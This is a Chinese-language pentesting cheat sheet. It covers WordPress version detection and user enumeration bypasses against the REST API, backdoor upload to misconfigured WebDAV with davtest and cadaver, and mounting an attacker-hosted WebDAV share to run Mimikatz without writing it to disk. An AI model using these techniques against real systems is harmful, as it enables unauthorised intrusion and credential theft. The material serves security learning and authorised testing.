# web应用枚举

&nbsp;

## Wordpress枚举

### 【wordpress基础】

* **wordpress目录结构**
  ```
  [文件夹] wp-admin      管理员页面
  [文件夹] wp-includes   
  [文件夹] wp-content    包含主题，插件，上传文件，默认情况下，uploads是以年月的形式组织显示的
  .htaccess
  robots.txt            有时没有
  index.php
  license.txt
  readme.html
  wp-config.php         其中包含数据库连接数据（账号密码）
  wp-activate.php
  wp-blog-header.php
  wp-comments-post.php
  wp-config-sample.php
  wp-cron.php
  wp-links-opml.php
  wp-load.php
  wp-login.php
  wp-mail.php
  wp-settings.php
  wp-signup.php
  wp-trackback.php
  xmlrpc.php
  ```
  
  * [文件夹] wp-content
    包含：themes文件夹，plugins文件夹，uploads文件夹，index.php

* **wordpress版本**
  * HTML meta信息中含有wordpress版本
    ```html
    <meta name =“ generator” content =“ WordPress 3.5.2” />
    ```
  * README.html
    readme.html中含有wordpress版本，但是新版wordpress中将这种信息抹除了
  * 网站HTML源中的版本
    在HTML源代码中 ， 该版本通常作为参数添加到页面加载的链接javascript和css资源上 
    ```html
    <link rel='stylesheet' id='wp-block-navigation-css' href='http://192.168.2.200:8000/wp-includes/blocks/navigation/style.min.css?ver=6.4' media='all' />
    ```
    显示wordpress版本为6.4

### 【wordpress用户枚举】

* **使用API枚举用户**
  * rest_route API枚举
    ```
  https://abc.com/blog/wp-json/wp/v2/users   屏蔽
  https://abc.com/blog/?rest_route=/wp/v2/users   绕过
    ```
    获得wordpress用户列表，用户id为1的用户
    
  * 使用wordpress公共API枚举用户
    例如jetpack插件会将用户列表数据导入到wordpress.com通过公共REST API提供
    ```
  https://blog.*******.com/wp-json/wp/v2/users 已屏蔽
  https://public-api.wordpress.com/rest/v1.1/sites/blog.*******.com/posts 绕过
    ```
  * 使用搜索枚举用户
    在少数情况下，我们遇到了没有明确阻止的API，但/wp/v2/users端点没有返回avatar_urls属性。这是由第三方安全插件或手动禁用头像（设置>讨论>头像）造成的。
    设置，将在网页和REST响应中隐藏头像。
    我们也找到了一个解决这些问题的方法。该端点支持参数 "搜索"。它的值与所有用户的字段匹配，包括电子邮件地址。通过简单的自动化，有可能发现每个电子邮件地址。与匹配的电子邮件相关的用户信息将在JSON响应中返回。根据经验，我们可以估计，揭示一个电子邮件地址需要200到400个请求。
    ```
  https://api.*****.com/wp-json/wp/v2/users  已屏蔽
  https://api.*****.com/wp-json/wp/v2/users?search=r@initech.com
  https://api.*****.com/wp-json/wp/v2/users?search=er@initech.com
  https://api.*****.com/wp-json/wp/v2/users?search=ter@initech.com
  https://api.*****.com/wp-json/wp/v2/users?search=eter@initech.com
  https://api.*****.com/wp-json/wp/v2/users?search=peter@initech.com  绕过
    ```
  * 绕过
    拼接绕过枚举用户
    有时主句会拒绝列出所有用户信息，但是可以正对一个用户进行枚举
    ```
  https://www.*****.org/wp-json/wp/v2/users  已屏蔽
  https://www.*****.org/wp-json/wp/v2/users/1  绕过
    ```
    大小写绕过枚举用户
    ```
  https://blog.*****.com/section/news?rest_route=/wp/v2/users  已屏蔽
  https://blog.*****.com/section/news?rest_route=/wp/v2/usErs  绕
    ```
    
### 【wordpress插件枚举】



&nbsp;

## WebDav枚举
* 通俗一点儿来说，WebDAV 就是一种互联网方法，应用此方法可以在服务器上划出一块存储空间，可以使用用户名和密码来控制访问，让用户可以直接存储、下载、编辑文件。

### 【webDav配置不当上传木马】

* 1）使用DavTest工具测试webdav能否执行一些脚本
  ```bash
  davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
  ```

* 2）使用cadaver工具连接webdav，上传脚本
  ```bash
  cadaver IP
  ```
  >登录成功后，使用upload，move，delete命令进行操作


### 【webdav无文件落地目标系统】

* window读取linux文件
  * （1）在win或者linux系统上搭建webdav服务环境，作为工具上传基址
    ```bash
    pip install PyWebDAV //win系统
    apt-get install python-webdav //linux系统
    davserver -D /工具路径 -n -H 10.10.10.10 //启动webdav
    ```
  * （2）当我们已经拥有命令执行权限时，需要将文件在目标机器上执行，由于 Windows 下载文件比较麻烦，故此采用 Webdav
    ```bash
    net use Z: http://10.10.10.10:8008 //挂载远程webdav
    net use Z: /DELETE //终止挂载
    ```
  * （3）当我们运行 Mimikatz 时，会从网络加载这个文件，而不会落地到目标机器


&nbsp;

